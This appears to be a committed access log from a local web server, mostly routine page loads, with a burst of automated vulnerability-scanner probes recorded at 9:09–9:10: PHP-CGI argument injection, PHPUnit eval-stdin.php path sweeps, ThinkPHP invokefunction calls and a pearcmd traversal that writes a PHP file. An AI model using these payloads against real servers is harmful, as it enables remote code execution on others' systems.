@@ -1,0 +1,111 @@
+ INFO  Accepting connections at http://localhost:3000
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 GET /
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 Returned 200 in 76 ms
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 GET /static/js/main.1984d81f.js
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 Returned 200 in 5 ms
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 GET /static/css/main.e6c13ad2.css
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 Returned 200 in 4 ms
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 GET /favicon.ico
+ HTTP  6/29/2025 8:50:59 AM 49.204.117.34 Returned 200 in 4 ms
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 GET /hhm:3000
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 GET /static/js/main.1984d81f.js
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 GET /static/css/main.e6c13ad2.css
+ HTTP  6/29/2025 8:51:17 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 8:51:18 AM 127.0.0.1 GET /favicon.ico
+ HTTP  6/29/2025 8:51:18 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:09:56 AM 127.0.0.1 POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+ HTTP  6/29/2025 9:09:56 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:09:57 AM 127.0.0.1 GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:09:57 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:09:58 AM 127.0.0.1 GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:09:58 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:09:59 AM 127.0.0.1 GET /vendor/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:09:59 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:09:59 AM 127.0.0.1 GET /vendor/phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:09:59 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:00 AM 127.0.0.1 GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+ HTTP  6/29/2025 9:10:00 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 GET /phpunit/phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:05 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:06 AM 127.0.0.1 GET /phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:06 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:07 AM 127.0.0.1 GET /phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:07 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:07 AM 127.0.0.1 GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:07 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:09 AM 127.0.0.1 GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:09 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:11 AM 127.0.0.1 GET /lib/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:11 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:12 AM 127.0.0.1 GET /lib/phpunit/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:12 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:10:12 AM 127.0.0.1 GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:12 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:13 AM 127.0.0.1 GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:13 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:14 AM 127.0.0.1 GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:14 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:15 AM 127.0.0.1 GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:15 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:15 AM 127.0.0.1 GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:15 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:16 AM 127.0.0.1 GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:16 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:17 AM 127.0.0.1 GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:17 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:18 AM 127.0.0.1 GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:18 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:19 AM 127.0.0.1 GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:19 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:20 AM 127.0.0.1 GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:20 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:21 AM 127.0.0.1 GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:21 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:23 AM 127.0.0.1 GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:23 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:24 AM 127.0.0.1 GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:24 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:25 AM 127.0.0.1 GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:25 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:25 AM 127.0.0.1 GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:25 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:26 AM 127.0.0.1 GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:26 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:26 AM 127.0.0.1 GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:26 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:10:27 AM 127.0.0.1 GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:27 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 9:10:28 AM 127.0.0.1 GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:28 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:29 AM 127.0.0.1 GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:29 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:29 AM 127.0.0.1 GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:29 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:31 AM 127.0.0.1 GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:31 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:32 AM 127.0.0.1 GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ HTTP  6/29/2025 9:10:32 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:32 AM 127.0.0.1 GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+ HTTP  6/29/2025 9:10:32 AM 127.0.0.1 Returned 200 in 0 ms
+ HTTP  6/29/2025 9:10:33 AM 127.0.0.1 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
+ HTTP  6/29/2025 9:10:33 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:34 AM 127.0.0.1 GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+ HTTP  6/29/2025 9:10:34 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:35 AM 127.0.0.1 GET /index.php?lang=../../../../../../../../tmp/index1
+ HTTP  6/29/2025 9:10:35 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:10:35 AM 127.0.0.1 GET /containers/json
+ HTTP  6/29/2025 9:10:35 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 9:33:51 AM 127.0.0.1 GET /manager/html
+ HTTP  6/29/2025 9:33:51 AM 127.0.0.1 Returned 200 in 1 ms
+ HTTP  6/29/2025 10:20:05 AM 127.0.0.1 GET /
+ HTTP  6/29/2025 10:20:05 AM 127.0.0.1 Returned 200 in 2 ms
+ HTTP  6/29/2025 10:22:50 AM 198.235.24.151 GET /
+ HTTP  6/29/2025 10:22:50 AM 198.235.24.151 Returned 200 in 1 ms
+
+ INFO  Gracefully shutting down. Please wait...
